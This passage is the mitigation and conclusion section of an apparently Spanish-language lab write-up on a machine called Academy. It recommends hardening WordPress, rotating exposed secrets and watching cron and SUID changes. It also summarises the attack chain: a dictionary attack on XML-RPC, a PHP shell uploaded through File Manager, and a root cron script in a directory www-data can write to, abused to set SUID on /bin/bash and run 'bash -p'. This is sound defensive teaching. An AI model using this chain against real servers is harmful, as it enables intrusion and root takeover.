- Subida de PHP mediante File Manager: retirar el plugin si no existe una necesidad operativa clara y restringir las cuentas que pueden modificar archivos de la instalación. Limitar la escritura del usuario del servidor web a los directorios imprescindibles y bloquear la ejecución de PHP en rutas destinadas a subidas, conforme a la [guía de endurecimiento de WordPress](https://developer.wordpress.org/advanced-administration/security/hardening/).

- Exposición de secretos en el filesystem: retirar las credenciales SSH embebidas en `/opt/backup.py`, rotar los secretos expuestos y restringir la lectura de `wp-config.php` a las cuentas necesarias para su funcionamiento. Utilizar un gestor de secretos cuando la arquitectura lo permita, siguiendo la [guía de gestión de secretos de OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html). Restringir permisos reduce la exposición a otros usuarios, pero no impide que una shell con el mismo contexto que la aplicación lea los secretos que esta necesita.

- Ejecución privilegiada desde `/opt`: establecer `root:root` como propietario de `/opt` y de `/opt/backup.sh`, eliminando la escritura de `www-data` sobre el script y toda su cadena de directorios. Proteger únicamente el archivo no basta si el usuario comprometido puede sustituirlo desde el directorio padre. Ejecutar la tarea con una cuenta menos privilegiada si su función no requiere root.

- Monitorización de cron y permisos SUID: vigilar cambios en las tareas programadas, en los scripts que invocan y en los permisos de binarios del sistema, especialmente la aparición inesperada de SUID sobre `/bin/bash`. Correlacionar estas modificaciones con ejecuciones como root desde directorios escribibles por cuentas de servicio. El abuso documentado corresponde a la sub-técnica [T1053.003 — Cron de MITRE ATT&CK](https://attack.mitre.org/techniques/T1053/003/), utilizada aquí para escalar privilegios.

## Conclusión

La cadena de compromiso de Academy se sostiene sobre dos fallos encadenados: una contraseña débil de WordPress, obtenida mediante un ataque de diccionario contra XML-RPC, que permite acceder al panel y utilizar File Manager para subir una shell PHP; 
y una tarea cron que ejecuta `/opt/backup.sh` como root desde un directorio propiedad de `www-data`, permitiendo que el usuario del servidor web cree el script que posteriormente ejecutará el proceso privilegiado. 
El primer fallo proporciona ejecución de comandos como `www-data`; el segundo convierte ese acceso en una escalada a root al establecer el bit SUID sobre `/bin/bash` y conservar el UID efectivo privilegiado mediante `bash -p`. 
Las credenciales expuestas y los demás hallazgos de enumeración quedan como información adicional, pero no intervienen en la vía de compromiso confirmada: el punto decisivo es que una cuenta de servicio sin privilegios controla el contenido de una ruta ejecutada por root.
